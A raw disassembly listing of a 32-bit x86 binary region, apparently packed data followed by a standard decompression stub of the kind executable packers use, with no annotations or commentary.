  4c7847:	outs   dx,DWORD PTR ds:[esi]
  4c7848:	dec    ebx
  4c7849:	cmp    eax,0x4fa84152
  4c784e:	cmp    ecx,DWORD PTR [edx-0x54]
  4c7851:	mov    DWORD PTR [esi+0x6c0e26c3],edi
  4c7857:	js     0x4c78d2
  4c7859:	fs imul edx,DWORD PTR es:[esi],0x2
  4c785e:	ret    
  4c785f:	inc    esp
  4c7860:	lock xlat BYTE PTR ds:[ebx]
  4c7862:	stos   DWORD PTR es:[edi],eax
  4c7863:	dec    ecx
  4c7864:	daa    
  4c7865:	call   0xec38:0x982a79f6
  4c786c:	dec    DWORD PTR [esp+eax*1]
  4c786f:	or     edx,DWORD PTR [edx+0x69a69ad3]
  4c7875:	and    BYTE PTR [edi],bl
  4c7877:	push   es
  4c7878:	sub    BYTE PTR es:[edi],ah
  4c787b:	dec    ebp
  4c787c:	shl    DWORD PTR [ecx*2+0x23250718],cl
  4c7883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c7884:	sub    DWORD PTR [esi-0x64c86597],esp
  4c788a:	add    edi,edi
  4c788c:	add    cl,BYTE PTR [edx]
  4c788e:	or     DWORD PTR [ecx-0x6596594c],edi
  4c7894:	fmul   QWORD PTR [ebp-0x5e]
  4c7897:	pop    ss
  4c7898:	or     BYTE PTR [eax+0x2781cb45],ah
  4c789e:	std    
  4c789f:	push   eax
  4c78a0:	adc    al,0x8
  4c78a2:	mov    ebp,0xc92a04e7
  4c78a7:	push   ebx
  4c78a8:	or     al,0xb
  4c78aa:	inc    edx
  4c78ab:	popa   
  4c78ac:	jae    0x4c785b
  4c78ae:	pop    ebp
  4c78af:	and    dh,BYTE PTR [eax]
  4c78b1:	cmp    eax,0x29387131
  4c78b6:	dec    edi
  4c78b7:	fwait
  4c78b8:	arpl   WORD PTR [ebx-0x56],si
  4c78bb:	dec    edi
  4c78bc:	fs ins BYTE PTR es:[edi],dx
  4c78be:	mov    eax,ds:0xa3175f16
  4c78c3:	pop    ecx
  4c78c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c78c5:	fdivr  QWORD PTR [ecx+eax*4+0x7]
  4c78c9:	inc    ecx
  4c78ca:	ins    BYTE PTR es:[edi],dx
  4c78cb:	imul   BYTE PTR [esp+esi*2]
  4c78ce:	mov    edi,0x648e4853
  4c78d3:	inc    ebp
  4c78d4:	inc    edi
  4c78d5:	cs mov eax,0x41d34664
  4c78db:	jp     0x4c7880
  4c78dd:	shl    BYTE PTR [ebp-0x15],cl
  4c78e0:	dec    eax
  4c78e1:	inc    ebp
  4c78e2:	pop    esi
  4c78e3:	scas   eax,DWORD PTR es:[edi]
  4c78e4:	dec    edi
  4c78e5:	inc    ebx
  4c78e6:	xchg   esp,eax
  4c78e7:	ins    BYTE PTR es:[edi],dx
  4c78e8:	jns    0x4c794d
  4c78ea:	sbb    ebp,DWORD PTR [esi+0x27]
  4c78ed:	fst    DWORD PTR [ebx]
  4c78ef:	outs   dx,BYTE PTR ds:[esi]
  4c78f0:	cwde   
  4c78f1:	cmp    dh,BYTE PTR [eax+0x364577de]
  4c78f7:	cmp    BYTE PTR [ebx+0x27],0x61
  4c78fb:	mov    ds:0xc180897e,al
  4c7900:	sar    DWORD PTR [ebp-0x717c5449],0x56
  4c7907:	je     0x4c791d
  4c7909:	jbe    0x4c793b
  4c790b:	sub    eax,DWORD PTR [esi+0x6b]
  4c790e:	inc    eax
  4c790f:	jo     0x4c798a
  4c7911:	sbb    ah,BYTE PTR [eax]
  4c7913:	(bad)  
  4c7914:	pop    ebx
  4c7915:	daa    
  4c7916:	dec    ebp
  4c7917:	popa   
  4c7918:	pop    ds
  4c7919:	call   0xf414:0x404301c1
  4c7920:	inc    ebp
  4c7921:	sub    BYTE PTR [esi-0x5],0xc1
  4c7925:	addr16 pop edi
  4c7927:	dec    esi
  4c7928:	outs   dx,DWORD PTR ds:[esi]
  4c7929:	stos   BYTE PTR es:[edi],al
  4c792a:	data16 jns 0x4c7956
  4c792d:	push   edi
  4c792e:	lea    esi,[ecx+eiz*4]
  4c7931:	push   ss
  4c7932:	and    al,0x65
  4c7934:	mov    dl,0xbe
  4c7936:	push   0x14f29c0e
  4c793b:	hlt    
  4c793c:	pop    ebx
  4c793d:	mov    al,ds:0xfb5883a2
  4c7942:	ret    0x4d43
  4c7945:	fcmovnu st,st(0)
  4c7947:	dec    eax
  4c7948:	mov    ds,WORD PTR [eax]
  4c794a:	call   0xe65e9c4f
  4c794f:	imul   ebx,esi,0xe5999efa
  4c7955:	add    al,0x64
  4c7957:	adc    BYTE PTR [ebp+0x2e],bl
  4c795a:	bound  ebp,QWORD PTR [edi-0x1d]
  4c795d:	rcr    DWORD PTR [edx+0x6f528a1e],0xb0
  4c7964:	jmp    0x1b1b0435
  4c7969:	retf   0x5438
  4c796c:	jo     0x4c7978
  4c796e:	sbb    esp,DWORD PTR [ebx+0x1d]
  4c7971:	push   0x4c
  4c7973:	dec    esi
  4c7974:	sbb    al,0x28
  4c7976:	arpl   WORD PTR [ecx],bp
  4c7978:	mov    edx,0x4c88ec7c
  4c797d:	out    0x1b,al
  4c797f:	push   ebp
  4c7980:	jo     0x4c79f2
  4c7982:	inc    edi
  4c7983:	loopne 0x4c7943
  4c7985:	sub    ah,BYTE PTR [ebp+0x75538127]
  4c798b:	bound  esp,QWORD PTR ds:0x4a8c055d
  4c7991:	inc    ebx
  4c7992:	ss nop
  4c7994:	jae    0x4c7a03
  4c7996:	pop    edx
  4c7997:	pop    DWORD PTR [ebx]
  4c7999:	push   esp
  4c799a:	xchg   BYTE PTR [edi+0x4a],ch
  4c799d:	sbb    al,0x40
  4c799f:	(bad)  
  4c79a0:	in     eax,dx
  4c79a1:	push   esi
  4c79a2:	sbb    al,0xe
  4c79a4:	mov    al,0x68
  4c79a6:	imul   edx,DWORD PTR [eax+0x29],0xffffffd9
  4c79aa:	or     cl,BYTE PTR [ebp-0x73]
  4c79ad:	jns    0x4c7a02
  4c79af:	mov    bh,0xe8
  4c79b1:	xchg   esp,eax
  4c79b2:	cdq    
  4c79b3:	or     eax,0x681eabee
  4c79b8:	loopne 0x4c7a36
  4c79ba:	sub    eax,0x88d671d6
  4c79bf:	rcr    DWORD PTR [edx+eax*4],1
  4c79c2:	push   0x42db862d
  4c79c7:	pop    ecx
  4c79c8:	in     eax,0x52
  4c79ca:	outs   dx,DWORD PTR ds:[esi]
  4c79cb:	push   esp
  4c79cc:	jo     0x4c79d1
  4c79ce:	or     cl,dl
  4c79d0:	dec    esp
  4c79d1:	push   ds
  4c79d2:	push   ds
  4c79d3:	je     0x4c7a39
  4c79d5:	sub    al,0x1a
  4c79d7:	sbb    eax,0xc47216e8
  4c79dc:	(bad)  
  4c79dd:	(bad)  
  4c79de:	lock les ecx,FWORD PTR [edx]
  4c79e1:	gs pushf 
  4c79e3:	lahf   
  4c79e4:	mov    dl,0x1e
  4c79e6:	loopne 0x4c79ee
  4c79e8:	sbb    DWORD PTR [ecx],ecx
  4c79ea:	or     BYTE PTR [edi-0x6f],ah
  4c79ed:	imul   edx,DWORD PTR ds:0x8c30058a,0xb51d7310
  4c79f7:	not    dl
  4c79f9:	add    DWORD PTR [eax],ebp
  4c79fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c79fc:	adc    al,0x6d
  4c79fe:	dec    ecx
  4c79ff:	lea    edx,[eax]
  4c7a01:	sub    bh,BYTE PTR [ebp-0x1fc9dce3]
  4c7a07:	or     DWORD PTR [ebx+0x7450379d],ebx
  4c7a0d:	sahf   
  4c7a0e:	dec    ebx
  4c7a0f:	imul   esi,DWORD PTR [esi],0x17ad754a
  4c7a15:	xor    BYTE PTR [edx+0x79],ah
  4c7a18:	das    
  4c7a19:	xchg   ecx,eax
  4c7a1a:	push   esi
  4c7a1b:	sbb    al,0x84
  4c7a1d:	out    dx,eax
  4c7a1e:	(bad)  
  4c7a1f:	fnstsw WORD PTR [ebx-0x78]
  4c7a22:	sbb    al,0x48
  4c7a24:	lahf   
  4c7a25:	xor    ecx,DWORD PTR [ebp+0x10]
  4c7a28:	rcl    DWORD PTR [edx+0xa460b0e],cl
  4c7a2e:	dec    edx
  4c7a2f:	sub    eax,0x1018b8b
  4c7a34:	dec    ecx
  4c7a35:	mov    ds:0x24841688,eax
  4c7a3a:	nop
  4c7a3b:	mov    cl,0x66
  4c7a3d:	(bad)
  4c7a40:	push   0x47546459
  4c7a45:	ins    DWORD PTR es:[edi],dx
  4c7a46:	push   ebp
  4c7a47:	and    ch,al
  4c7a49:	or     BYTE PTR [edx+eax*2+0x25753b54],ch
  4c7a50:	or     al,0xd6
  4c7a52:	xor    dl,ch
  4c7a54:	in     eax,dx
  4c7a55:	jmp    0xe1b0ba3b
  4c7a5a:	les    eax,FWORD PTR [ebp+0x676c9843]
  4c7a60:	inc    edx
  4c7a61:	or     BYTE PTR [edx+0x7416150b],dl
  4c7a67:	push   esi
  4c7a68:	jp     0x4c7ac0
  4c7a6a:	xlat   BYTE PTR ds:[ebx]
  4c7a6b:	jge    0x4c7a98
  4c7a6d:	xchg   edi,eax
  4c7a6e:	data16 sub BYTE PTR [ebx-0x19],ch
  4c7a72:	ror    BYTE PTR [ecx],1
  4c7a74:	dec    ebx
  4c7a75:	or     dl,BYTE PTR [edx+edi*1+0x3a]
  4c7a79:	mov    dl,0xb1
  4c7a7b:	mov    bh,0xa
  4c7a7d:	mov    bh,0x17
  4c7a7f:	mov    bh,0x15
  4c7a81:	(bad)  
  4c7a82:	mov    esp,0xcd70d230
  4c7a87:	retf   
  4c7a88:	add    DWORD PTR [esi-0x15],edx
  4c7a8b:	pushf  
  4c7a8c:	and    eax,0x43b33740
  4c7a91:	xchg   edx,ebx
  4c7a93:	in     al,dx
  4c7a94:	ins    DWORD PTR es:[edi],dx
  4c7a95:	adc    ah,BYTE PTR [eax-0x2f849aa1]
  4c7a9b:	shl    ch,1
  4c7a9d:	sar    BYTE PTR [ebx+edx*1-0x50ecacc9],cl
  4c7aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c7aa5:	in     al,dx
  4c7aa6:	lods   eax,DWORD PTR ds:[esi]
  4c7aa7:	es pop ss
  4c7aa9:	fstp   QWORD PTR [edi+0xcf6c11d]
  4c7aaf:	shr    DWORD PTR [ecx-0x25],0x44
  4c7ab3:	(bad)  
  4c7ab4:	loope  0x4c7a47
  4c7ab6:	and    eax,0x9ae4997
  4c7abb:	jge    0x4c7a75
  4c7abd:	daa    
  4c7abe:	xchg   BYTE PTR [eax+0x5b691f2d],cl
  4c7ac4:	xchg   edx,eax
  4c7ac5:	loopne 0x4c7a8a
  4c7ac7:	sbb    DWORD PTR [edi-0x3155ae38],esp
  4c7acd:	cmp    ebp,ebp
  4c7acf:	pop    ds
  4c7ad0:	loop   0x4c7ae5
  4c7ad2:	shr    esi,1
  4c7ad4:	and    DWORD PTR [ebx+0x2157ebc2],edi
  4c7ada:	adc    eax,0xb2e7a297
  4c7adf:	push   edx
  4c7ae0:	fisub  DWORD PTR [esi-0x4f]
  4c7ae3:	mov    bh,0x5b
  4c7ae5:	fimul  DWORD PTR [edx+ecx*1]
  4c7ae8:	mov    ebx,0x531dc776
  4c7aed:	and    esp,DWORD PTR [ecx+ebp*2+0x471b536d]
  4c7af4:	aas    
  4c7af5:	pop    eax
  4c7af6:	jo     0x4c7b4d
  4c7af8:	add    esi,DWORD PTR [edx+eiz*8]
  4c7afb:	jb     0x4c7b61
  4c7afd:	lea    eax,[eax-0x20]
  4c7b00:	jo     0x4c7b32
  4c7b02:	inc    ecx
  4c7b03:	push   ebp
  4c7b04:	sbb    ah,bl
  4c7b06:	xchg   esp,eax
  4c7b07:	rol    DWORD PTR [edi],1
  4c7b09:	mov    ecx,0x3d616357
  4c7b0e:	(bad)  [esi+eiz*4+0x3585cc37]
  4c7b15:	or     DWORD PTR [ecx-0x666b9e36],ebp
  4c7b1b:	bound  edi,QWORD PTR [eax]
  4c7b1d:	les    ebx,FWORD PTR [ebx+0x414aaf41]
  4c7b23:	test   BYTE PTR [ebx+0x62],ah
  4c7b26:	sbb    esp,0x7dcbb5d2
  4c7b2c:	and    eax,DWORD PTR [edi+0x2]
  4c7b2f:	mov    al,0xee
  4c7b31:	ins    DWORD PTR es:[edi],dx
  4c7b32:	sbb    DWORD PTR [esi+0x6b],edx
  4c7b35:	pop    ss
  4c7b36:	arpl   ax,cx
  4c7b38:	dec    edx
  4c7b39:	cdq    
  4c7b3a:	(bad)  
  4c7b3b:	xchg   ebp,eax
  4c7b3c:	or     eax,0xee0bf543
  4c7b41:	inc    eax
  4c7b42:	add    BYTE PTR [edx],dh
  4c7b44:	and    eax,0x1bc10120
  4c7b49:	jecxz  0x4c7b9d
  4c7b4b:	stc    
  4c7b4c:	jl     0x4c7b8f
  4c7b4e:	pop    ds
  4c7b4f:	push   es
  4c7b50:	xchg   ebp,eax
  4c7b51:	shl    DWORD PTR [ebx],0x8a
  4c7b54:	in     eax,dx
  4c7b55:	push   ecx
  4c7b56:	mov    al,ds:0x27d86b55
  4c7b5b:	xchg   ebx,eax
  4c7b5c:	and    DWORD PTR [ebp-0x26],ebp
  4c7b5f:	xchg   ecx,eax
  4c7b60:	imul   ecx,DWORD PTR [eax],0x8c55e5d3
  4c7b66:	clc    
  4c7b67:	clc    
  4c7b68:	les    ecx,FWORD PTR [ebx+ebp*1]
  4c7b6b:	ret    
  4c7b6c:	(bad)  
  4c7b6d:	enter  0x101e,0xae
  4c7b71:	icebp  
  4c7b72:	dec    edi
  4c7b73:	ins    DWORD PTR es:[edi],dx
  4c7b74:	cmp    DWORD PTR [edx+0x17d16d31],esi
  4c7b7a:	mov    ebx,0x60518665
  4c7b7f:	sbb    al,0x59
  4c7b81:	mov    ebx,0x8595adf1
  4c7b86:	xchg   esi,eax
  4c7b87:	adc    esp,DWORD PTR [eax-0x7f]
  4c7b8a:	and    DWORD PTR fs:[edx],ebx
  4c7b8d:	retf   
  4c7b8e:	scas   al,BYTE PTR es:[edi]
  4c7b8f:	ds push esi
  4c7b91:	imul   esi,DWORD PTR [ebx+0x69],0x385f33d5
  4c7b98:	scas   al,BYTE PTR es:[edi]
  4c7b99:	sub    eax,DWORD PTR [ecx+0x13]
  4c7b9c:	fld    DWORD PTR [edi+0x3a]
  4c7b9f:	push   es
  4c7ba0:	pop    eax
  4c7ba1:	add    al,0xef
  4c7ba3:	into   
  4c7ba4:	fsubr  DWORD PTR [eax+0x3a]
  4c7ba7:	shr    BYTE PTR [edx],0x8e
  4c7baa:	pop    ebx
  4c7bab:	xor    eax,0xdc0be01d
  4c7bb0:	mov    ds:0x54d35835,al
  4c7bb5:	outs   dx,DWORD PTR ds:[esi]
  4c7bb6:	sub    ebp,DWORD PTR [ebp-0x38]
  4c7bb9:	nop
  4c7bba:	mov    ds:0x806c717f,eax
  4c7bbf:	push   0xfbe40291
  4c7bc4:	sub    cl,BYTE PTR [eax]
  4c7bc6:	add    eax,0xf9382452
  4c7bcb:	fwait
  4c7bcc:	test   DWORD PTR [ecx],esi
  4c7bce:	loopne 0x4c7bdb
  4c7bd0:	pushf  
  4c7bd1:	push   edi
  4c7bd2:	test   eax,eax
  4c7bd4:	or     al,0xcf
  4c7bd6:	push   edx
  4c7bd7:	sub    DWORD PTR [eax-0x5f],eax
  4c7bda:	test   DWORD PTR [ebx-0x46],0x888c21b5
  4c7be1:	push   cs
  4c7be2:	mov    ebp,0xb3293d4c
  4c7be7:	pop    esp
  4c7be8:	test   BYTE PTR [ebx],bl
  4c7bea:	mov    DWORD PTR [ebx+eax*4+0x3],esp
  4c7bee:	sbb    BYTE PTR [eax-0x7eeb20a3],bh
  4c7bf4:	shl    BYTE PTR [edx+0x39],cl
  4c7bf7:	mov    ebx,0x88476091
  4c7bfc:	xchg   DWORD PTR [edi+0x2d],eax
  4c7bff:	sub    BYTE PTR [ebp+0x1b],ch
  4c7c02:	lods   al,BYTE PTR ds:[esi]
  4c7c03:	jnp    0x4c7bea
  4c7c05:	sbb    esi,DWORD PTR [esi+0x59135a4c]
  4c7c0b:	inc    ebp
  4c7c0c:	inc    ecx
  4c7c0d:	aad    0x4
  4c7c0f:	dec    edx
  4c7c10:	cdq    
  4c7c11:	cmp    DWORD PTR [edi-0x7a292a50],esp
  4c7c17:	mov    edi,0xbcbd257f
  4c7c1c:	scas   al,BYTE PTR es:[edi]
  4c7c1d:	push   0x32676f2b
  4c7c22:	mov    edx,0x3f970ed0
  4c7c27:	jg     0x4c7bfc
  4c7c29:	jno    0x4c7c41
  4c7c2b:	pusha  
  4c7c2c:	add    eax,0x5bb811f
  4c7c31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c7c32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c7c33:	pop    ds
  4c7c34:	or     edx,ecx
  4c7c36:	mov    edi,0x98dd4970
  4c7c3b:	pop    ss
  4c7c3c:	in     al,dx
  4c7c3d:	add    al,0x22
  4c7c3f:	xlat   BYTE PTR ds:[ebx]
  4c7c40:	daa    
  4c7c41:	xchg   edx,eax
  4c7c42:	add    bh,0x4a
  4c7c45:	pop    ebx
  4c7c46:	add    BYTE PTR [edi-0x41],0x73
  4c7c4a:	retf   
  4c7c4b:	out    0x18,al
  4c7c4d:	in     eax,dx
  4c7c4e:	fimul  DWORD PTR [ebp+0x47]
  4c7c51:	xchg   ecx,eax
  4c7c52:	mov    dl,0x6b
  4c7c54:	lock push eax
  4c7c56:	cmp    BYTE PTR [esi],ch
  4c7c58:	inc    ecx
  4c7c59:	xchg   esp,eax
  4c7c5a:	lods   al,BYTE PTR ds:[esi]
  4c7c5b:	mov    ecx,0x25ae978e
  4c7c60:	lahf   
  4c7c61:	jns    0x4c7ca5
  4c7c63:	sar    BYTE PTR [ebp-0x7e],1
  4c7c66:	xchg   ebp,eax
  4c7c67:	push   edx
  4c7c68:	xchg   ecx,eax
  4c7c69:	sub    eax,0x2e247340
  4c7c6e:	and    eax,DWORD PTR [edi+0x0]
  4c7c71:	or     ebp,edx
  4c7c73:	nop
  4c7c74:	nop
  4c7c75:	into   
  4c7c76:	pop    eax
  4c7c77:	(bad)  
  4c7c78:	scas   al,BYTE PTR es:[edi]
  4c7c79:	cmp    al,BYTE PTR [esi]
  4c7c7b:	pop    esp
  4c7c7c:	lds    ebx,FWORD PTR [eax]
  4c7c7e:	iret   
  4c7c7f:	outs   dx,DWORD PTR ds:[esi]
  4c7c80:	mov    cl,0x53
  4c7c82:	pop    esp
  4c7c83:	mov    dl,BYTE PTR [ebx+0x2c]
  4c7c86:	adc    eax,0x5a7551db
  4c7c8b:	xchg   edi,eax
  4c7c8c:	outs   dx,BYTE PTR ds:[esi]
  4c7c8d:	js     0x4c7c17
  4c7c8f:	jo     0x4c7cdc
  4c7c91:	cld    
  4c7c92:	jmp    0x1b5d0a92
  4c7c97:	xor    BYTE PTR [ecx+0x53],ah
  4c7c9a:	add    al,0x6c
  4c7c9c:	xchg   edi,eax
  4c7c9d:	xchg   esi,eax
  4c7c9e:	lea    esi,[ebp-0x27ea9a64]
  4c7ca4:	push   ss
  4c7ca5:	inc    ecx
  4c7ca6:	outs   dx,BYTE PTR ds:[esi]
  4c7ca7:	inc    edi
  4c7ca8:	jge    0x4c7d29
  4c7caa:	pop    esi
  4c7cab:	out    dx,eax
  4c7cac:	sub    BYTE PTR [edi*2-0x1e42dcb7],ch
  4c7cb3:	add    ch,bh
  4c7cb5:	adc    DWORD PTR [ecx+0x15],esi
  4c7cb8:	pop    ss
  4c7cb9:	add    DWORD PTR [ebx],edx
  4c7cbb:	push   0x47d9a950
  4c7cc0:	inc    esi
  4c7cc1:	xor    eax,0xd36fab15
  4c7cc6:	inc    ecx
  4c7cc7:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c7cc9:	mov    al,ds:0x502f93e9
  4c7cce:	sahf   
  4c7ccf:	imul   edi,DWORD PTR [edi],0x55
  4c7cd2:	outs   dx,BYTE PTR ds:[esi]
  4c7cd3:	fimul  DWORD PTR [eax-0x388d773b]
  4c7cd9:	sub    eax,0x6e03422c
  4c7cde:	jne    0x4c7d4b
  4c7ce0:	push   ds
  4c7ce1:	fs sub eax,0x429545aa
  4c7ce7:	int    0xb9
  4c7ce9:	lahf   
  4c7cea:	add    eax,0x3f40447a
  4c7cef:	add    BYTE PTR [esi-0x38],ah
  4c7cf2:	and    al,0x62
  4c7cf4:	int    0x3a
  4c7cf6:	cmp    cl,bl
  4c7cf8:	xchg   edi,eax
  4c7cf9:	push   ebx
  4c7cfa:	test   eax,0x2b75e08d
  4c7cff:	xor    DWORD PTR [eax+0x8],ecx
  4c7d02:	cmp    cl,bl
  4c7d04:	mov    BYTE PTR [ebx+ebp*2-0x512c3511],dl
  4c7d0b:	gs add eax,0x72bc5721
  4c7d11:	cmp    BYTE PTR [ebp-0x7c],dh
  4c7d14:	xor    cl,BYTE PTR [eax]
  4c7d16:	idiv   ch
  4c7d18:	push   edi
  4c7d19:	adc    DWORD PTR [edx+eax*2],0xef2565b8
  4c7d20:	add    BYTE PTR [esi+esi*8-0x73a9d6cf],ch
  4c7d27:	jle    0x4c7d01
  4c7d29:	dec    edi
  4c7d2a:	loopne 0x4c7d68
  4c7d2c:	dec    eax
  4c7d2d:	mov    edi,0x48084c6e
  4c7d32:	pop    ebx
  4c7d33:	and    BYTE PTR [ebx],bh
  4c7d35:	and    esp,DWORD PTR [esi+0x4dad8d3d]
  4c7d3b:	sub    DWORD PTR [ebx-0x4f61ace3],edi
  4c7d41:	mul    ah
  4c7d43:	and    ecx,ecx
  4c7d45:	outs   dx,DWORD PTR ds:[esi]
  4c7d46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c7d47:	push   ebp
  4c7d48:	push   cs
  4c7d49:	call   0x7048:0xe4aeb803
  4c7d50:	dec    ecx
  4c7d51:	ins    DWORD PTR es:[edi],dx
  4c7d52:	cmp    DWORD PTR [esi+eiz*8+0x432b45f3],esi
  4c7d59:	inc    eax
  4c7d5a:	fdiv   DWORD PTR ds:0xea52a7d0
  4c7d60:	jae    0x4c7d85
  4c7d62:	xchg   ax,ax
  4c7d64:	dec    ebp
  4c7d65:	xor    ebx,DWORD PTR ds:0x3b454623
  4c7d6b:	sbb    eax,DWORD PTR [ebx+0x13408560]
  4c7d71:	xor    ecx,DWORD PTR [ebp-0x1589487e]
  4c7d77:	retf   
  4c7d78:	repz cmp eax,0xe9c98c34
  4c7d7e:	sub    ebp,ebp
  4c7d80:	(bad)  
  4c7d81:	sbb    cl,BYTE PTR [edx-0xd573ff4]
  4c7d87:	test   BYTE PTR [esi+eiz*2+0x33],dh
  4c7d8b:	sbb    esi,DWORD PTR [eax]
  4c7d8d:	retf   0xd488
  4c7d90:	add    al,0x16
  4c7d92:	and    dl,BYTE PTR [eax+eax*4+0x63548568]
  4c7d99:	imul   edi,DWORD PTR [ecx-0x26],0xfd340c22
  4c7da0:	outs   dx,BYTE PTR ds:[esi]
  4c7da1:	xchg   esp,eax
  4c7da2:	xchg   esp,eax
  4c7da3:	test   al,0x69
  4c7da5:	call   0xf15:0x497fff6
  4c7dac:	adc    DWORD PTR [esp+esi*1],edx
  4c7daf:	dec    ebp
  4c7db0:	sar    DWORD PTR [edx],cl
  4c7db2:	jnp    0x4c7dc6
  4c7db4:	add    al,0xd
  4c7db6:	jae    0x4c7dba
  4c7db8:	add    eax,DWORD PTR [edi]
  4c7dba:	xor    eax,0x1704d34d
  4c7dbf:	adc    esi,DWORD PTR [ebp+edi*4-0x53]
  4c7dc3:	test   DWORD PTR [edx],ebx
  4c7dc5:	sub    DWORD PTR [edi+ebp*2+0x39043429],esp
  4c7dcc:	inc    esp
  4c7dcd:	dec    edx
  4c7dce:	(bad)  [eax]
  4c7dd0:	mov    bh,0x82
  4c7dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c7dd3:	dec    ebx
  4c7dd4:	shl    BYTE PTR [esi],0x4c
  4c7dd7:	mov    edi,0x5cbe9080
  4c7ddc:	pop    edi
  4c7ddd:	hlt    
  4c7dde:	dec    esi
  4c7ddf:	add    eax,esp
  4c7de1:	add    BYTE PTR [ebx],ah
  4c7de3:	add    DWORD PTR [edx-0x49],esi
  4c7de6:	repnz stc 
  4c7de8:	or     eax,DWORD PTR [ecx]
  4c7dea:	or     al,BYTE PTR [eax]
  4c7dec:	add    ah,bl
  4c7dee:	add    ecx,eax
  4c7df0:	gs push cs
  4c7df2:	addr16 pop es
  4c7df4:	pop    ecx
  4c7df5:	rsqrtps xmm1,XMMWORD PTR [edi]
  4c7df8:	inc    eax
  4c7df9:	pop    ss
  4c7dfa:	adc    al,0x5
  4c7dfc:	fdiv   QWORD PTR [edi+esi*4+0x340f676d]
  4c7e03:	or     al,0x3c
  4c7e05:	add    al,0x3b
  4c7e07:	ret    
  4c7e08:	or     ch,BYTE PTR [ebp+0x1b]
  4c7e0b:	sbb    ebp,DWORD PTR [ebx+0xd0f5780]
  4c7e11:	add    DWORD PTR [esi+0x1ced75b1],esi
  4c7e17:	aam    0x9e
  4c7e19:	push   esp
  4c7e1a:	lds    esi,FWORD PTR [eax-0x97257a2]
  4c7e20:	and    BYTE PTR ds:0x444ecd8c,al
  4c7e26:	or     BYTE PTR ds:0x29a0b6f7,bh
  4c7e2c:	cs push ds
  4c7e2e:	jmp    FWORD PTR ds:0x660e0f6
  4c7e34:	or     BYTE PTR [ecx],ah
  4c7e36:	xlat   BYTE PTR ds:[ebx]
  4c7e37:	add    al,0x85
  4c7e39:	jae    0x4c7e9f
  4c7e3b:	pop    ebx
  4c7e3c:	mov    esp,0x722e6004
  4c7e41:	outs   dx,BYTE PTR fs:[esi]
  4c7e43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c7e44:	rcr    bh,0x0
  4c7e47:	loopne 0x4c7e29
  4c7e49:	fstp   DWORD PTR [ebx+0x40b10cd8]
  4c7e4f:	add    al,0x2e
  4c7e51:	dec    ebp
  4c7e52:	add    BYTE PTR [eax-0x59],bl
  4c7e55:	in     eax,dx
  4c7e56:	dec    eax
  4c7e57:	sahf   
  4c7e58:	(bad)  
  4c7e59:	xchg   DWORD PTR [ecx],ecx
  4c7e5b:	dec    esi
  4c7e5c:	push   0x739ec0ec
  4c7e61:	jns    0x4c7df3
  4c7e63:	mov    al,ds:0xd7005058
  4c7e68:	out    0x0,al
  4c7e6a:	mov    ?,WORD PTR [ebx+0x54f68f0d]
  4c7e70:	or     DWORD PTR [edi-0x4b71d000],ebx
  4c7e76:	fnstsw WORD PTR [edi-0x67]
  4c7e79:	dec    edi
  4c7e7a:	xchg   edx,eax
  4c7e7b:	and    al,0x49
  4c7e7d:	ret    0xc
  4c7e80:	add    BYTE PTR [eax],al
  4c7e82:	or     BYTE PTR [edx-0x1],0x0
	...
  4c7e8e:	add    BYTE PTR [eax],al
  4c7e90:	pusha  
  4c7e91:	mov    esi,0x486000
  4c7e96:	lea    edi,[esi-0x85000]
  4c7e9c:	push   edi
  4c7e9d:	jmp    0x4c7eaa
  4c7e9f:	nop
  4c7ea0:	mov    al,BYTE PTR [esi]
  4c7ea2:	inc    esi
  4c7ea3:	mov    BYTE PTR [edi],al
  4c7ea5:	inc    edi
  4c7ea6:	add    ebx,ebx
  4c7ea8:	jne    0x4c7eb1
  4c7eaa:	mov    ebx,DWORD PTR [esi]
  4c7eac:	sub    esi,0xfffffffc
  4c7eaf:	adc    ebx,ebx
  4c7eb1:	jb     0x4c7ea0
  4c7eb3:	mov    eax,0x1
  4c7eb8:	add    ebx,ebx
  4c7eba:	jne    0x4c7ec3
  4c7ebc:	mov    ebx,DWORD PTR [esi]
  4c7ebe:	sub    esi,0xfffffffc
  4c7ec1:	adc    ebx,ebx
  4c7ec3:	adc    eax,eax
  4c7ec5:	add    ebx,ebx
  4c7ec7:	jae    0x4c7ed4
  4c7ec9:	jne    0x4c7ef3
  4c7ecb:	mov    ebx,DWORD PTR [esi]
  4c7ecd:	sub    esi,0xfffffffc
  4c7ed0:	adc    ebx,ebx
  4c7ed2:	jb     0x4c7ef3
  4c7ed4:	dec    eax
  4c7ed5:	add    ebx,ebx
  4c7ed7:	jne    0x4c7ee0
  4c7ed9:	mov    ebx,DWORD PTR [esi]
  4c7edb:	sub    esi,0xfffffffc
  4c7ede:	adc    ebx,ebx
  4c7ee0:	adc    eax,eax
  4c7ee2:	jmp    0x4c7eb8
  4c7ee4:	add    ebx,ebx
  4c7ee6:	jne    0x4c7eef
  4c7ee8:	mov    ebx,DWORD PTR [esi]
  4c7eea:	sub    esi,0xfffffffc
  4c7eed:	adc    ebx,ebx
  4c7eef:	adc    ecx,ecx
  4c7ef1:	jmp    0x4c7f45
  4c7ef3:	xor    ecx,ecx
  4c7ef5:	sub    eax,0x3
  4c7ef8:	jb     0x4c7f0b
  4c7efa:	shl    eax,0x8
  4c7efd:	mov    al,BYTE PTR [esi]
  4c7eff:	inc    esi
  4c7f00:	xor    eax,0xffffffff
  4c7f03:	je     0x4c7f7a
  4c7f05:	sar    eax,1
  4c7f07:	mov    ebp,eax
  4c7f09:	jmp    0x4c7f16
  4c7f0b:	add    ebx,ebx
  4c7f0d:	jne    0x4c7f16
  4c7f0f:	mov    ebx,DWORD PTR [esi]
  4c7f11:	sub    esi,0xfffffffc
  4c7f14:	adc    ebx,ebx
  4c7f16:	jb     0x4c7ee4
  4c7f18:	inc    ecx
  4c7f19:	add    ebx,ebx
  4c7f1b:	jne    0x4c7f24
  4c7f1d:	mov    ebx,DWORD PTR [esi]
  4c7f1f:	sub    esi,0xfffffffc
  4c7f22:	adc    ebx,ebx
  4c7f24:	jb     0x4c7ee4
